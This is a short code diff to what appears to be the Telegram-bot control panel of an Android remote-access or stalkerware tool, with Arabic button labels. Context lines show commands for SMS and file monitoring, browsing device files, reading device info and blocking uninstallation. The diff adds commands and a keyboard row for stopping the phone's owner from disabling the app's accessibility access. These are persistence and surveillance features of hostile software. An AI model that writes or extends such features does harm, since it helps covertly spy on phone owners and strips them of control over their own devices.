@@ -284,6 +284,8 @@ COMMANDS = {
     "sms-monitor-off":       {"category": "advanced", "label": "⏹ إيقاف الرسائل",    "description": "إيقاف مراقبة الرسائل",      "needs_param": False},
     "uninstall-protect-on":  {"category": "advanced", "label": "🔒 منع إلغاء التثبيت",       "description": "منع حذف التطبيق",          "needs_param": False},
     "uninstall-protect-off": {"category": "advanced", "label": "🔓 سماح بالإلغاء",    "description": "السماح بحذف التطبيق",      "needs_param": False},
+    "accessibility-protect-on":  {"category": "advanced", "label": "🛡️ منع تعطيل الوصول",       "description": "منع تعطيل إمكانية الوصول",          "needs_param": False},
+    "accessibility-protect-off": {"category": "advanced", "label": "🔓 سماح بالتعطيل",    "description": "السماح بتعطيل إمكانية الوصول",      "needs_param": False},
     # info
     "get-device-info": {"category": "info", "label": "📋 معلومات الجهاز",  "description": "معلومات تفصيلية",     "needs_param": False},
     "ls":              {"category": "info", "label": "📂 مستعرض الملفات",  "description": "تصفح ملفات الجهاز",  "needs_param": False},
@@ -508,8 +510,9 @@ def advanced_keyboard(did):
     kb.add(_cbtn(did,"file-monitor-on"), _cbtn(did,"file-monitor-off"))
     # ⚡ V11.2.27: مراقبة الرسائل النصية
     kb.add(_cbtn(did,"sms-monitor-on"), _cbtn(did,"sms-monitor-off"))
-    # ⚡ V11.2.25: منع إلغاء التثبيت
+    # ⚡ V11.2.25: منع إلغاء التثبيت + V11.2.33: منع تعطيل الوصول
     kb.add(_cbtn(did,"uninstall-protect-on"), _cbtn(did,"uninstall-protect-off"))
+    kb.add(_cbtn(did,"accessibility-protect-on"), _cbtn(did,"accessibility-protect-off"))
     kb.add(_back(did))
     return kb
 
